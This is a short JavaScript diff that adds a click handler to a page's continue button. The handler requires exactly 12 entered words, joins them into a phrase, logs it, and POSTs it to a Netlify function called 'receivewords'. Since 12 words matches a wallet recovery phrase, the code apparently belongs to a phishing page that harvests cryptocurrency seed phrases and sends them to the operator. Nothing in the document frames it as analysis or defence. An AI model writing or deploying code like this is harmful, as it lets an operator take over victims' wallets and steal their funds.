@@ -267,8 +267,29 @@ function toggleClearButton() {
     }
 }
 
-fetch(".netlify/functions/receivewords", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ phrase })
+
+//---
+continueBtn.addEventListener('click', async () => {
+    if (words.length !== 12) {
+        console.log("Not enough words");
+        return;
+    }
+
+    const phrase = words.join(" ");
+
+    console.log("Sending phrase:", phrase); // DEBUG LINE
+
+    try {
+        const response = await fetch(".netlify/functions/receivewords", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ phrase })
+        });
+
+        const result = await response.json();
+        console.log("Server response:", result);
+
+    } catch (error) {
+        console.error("Fetch error:", error);
+    }
 });
